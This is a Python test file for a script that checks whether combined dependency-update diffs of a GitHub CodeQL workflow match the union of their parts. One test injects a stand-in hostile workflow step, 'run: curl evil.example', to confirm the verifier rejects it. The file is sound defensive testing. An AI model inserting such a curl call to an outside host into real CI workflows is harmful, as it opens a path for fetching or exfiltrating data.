"""Tests for coupled-set consolidation verification."""

from scripts.security import dep_triage_consolidate as dcon

MEMBER_A = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -1,3 +1,3 @@
-      uses: github/codeql-action/init@aaa # v4.37.9
+      uses: github/codeql-action/init@bbb # v4.38.0
"""

MEMBER_B = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -10,3 +10,3 @@
-      uses: github/codeql-action/analyze@aaa # v4.37.9
+      uses: github/codeql-action/analyze@bbb # v4.38.0
"""


def test_added_lines_extracts_only_additions():
    assert dcon.added_lines(MEMBER_A) == {
        "uses: github/codeql-action/init@bbb # v4.38.0"
    }


def test_added_lines_ignores_file_headers():
    assert not any("+++" in line for line in dcon.added_lines(MEMBER_A))


def test_verify_union_accepts_exact_union():
    combined = MEMBER_A + MEMBER_B
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], combined)
    assert ok and not missing and not extra


def test_verify_union_rejects_missing_member_change():
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], MEMBER_A)
    assert not ok
    assert "uses: github/codeql-action/analyze@bbb # v4.38.0" in missing


def test_verify_union_rejects_unexplained_extra_change():
    sneaky = (
        MEMBER_A
        + MEMBER_B
        + ("--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n")
    )
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], sneaky)
    assert not ok
    assert "run: curl evil.example" in extra


def test_branch_name_is_slugified():
    assert dcon.branch_name("github/codeql-action", "4.38.0") == (
        "dep-consolidate/github-codeql-action-4.38.0"
    )
